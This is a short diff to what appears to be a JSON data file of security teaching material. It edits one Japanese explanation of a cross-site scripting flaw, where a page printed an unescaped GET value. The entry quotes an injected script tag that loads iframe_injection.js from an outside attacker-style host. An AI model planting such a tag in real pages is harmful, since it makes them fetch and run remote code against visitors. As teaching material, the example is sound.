@@ -31,7 +31,7 @@
                     "languages": ["html", "php"]
                 },
                 {
-                    "text": "特殊文字のエスケープを行わずにGETリクエストで受け取ったnameの値を表示していました。\nその結果、攻撃者に以下のタグを埋め込まれてしまいました。\n<script src=http://www.trap.cp.jp/iframe_injection.js></script>",
+                    "text": "特殊文字のエスケープを行わずにGETリクエストで受け取った値を表示していました。\nその結果、攻撃者に以下のタグを埋め込まれてしまいました。\n<script src=http://www.trap.cp.jp/iframe_injection.js></script>",
                     "languages": ["html"]
                 },
                 {
